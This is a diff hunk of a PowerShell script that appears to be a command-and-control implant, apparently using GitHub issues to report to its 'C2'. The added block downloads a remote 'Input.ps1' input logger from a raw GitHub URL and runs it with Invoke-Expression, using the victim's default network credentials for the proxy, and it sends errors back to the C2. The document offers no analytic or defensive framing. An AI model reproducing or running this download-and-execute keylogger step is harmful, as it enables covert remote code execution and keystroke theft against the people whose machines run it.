@@ -297,3 +297,23 @@ catch
 	Write-Host "DEBUG: Exception thrown trying to upload the process info. Notified C2. Exiting."; Start-Sleep -s 600
 	Exit
 }
+
+#Execute the Input script
+try
+{
+	Write-Console -Body "Attempting to execute input logger..." -IssueNumber $issueNumber
+	Write-Host "DEBUG: Attempting to execute input logger..."
+	(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials
+	(Invoke-WebRequest -UseBasicParsing -Uri 'https://raw.githubusercontent.com/BeinnUais1/ceannard1/master/Input.ps1') | Invoke-Expression
+}
+catch
+{
+	Send-PackageMessage -PackageName "EXCEPTION" -IssueNumber $issueNumber -Body ("Exception thrown trying to start the input logger. Exiting. Error: " + $Error)
+	Write-Console -Body "Exception thrown trying to start the input logger. Notified C2. Exiting." -IssueNumber $issueNumber
+	Write-Host "DEBUG: Exception thrown trying to start the input logger. Notified C2. Exiting."; Start-Sleep -s 600
+	Exit
+}
+
+
+
+
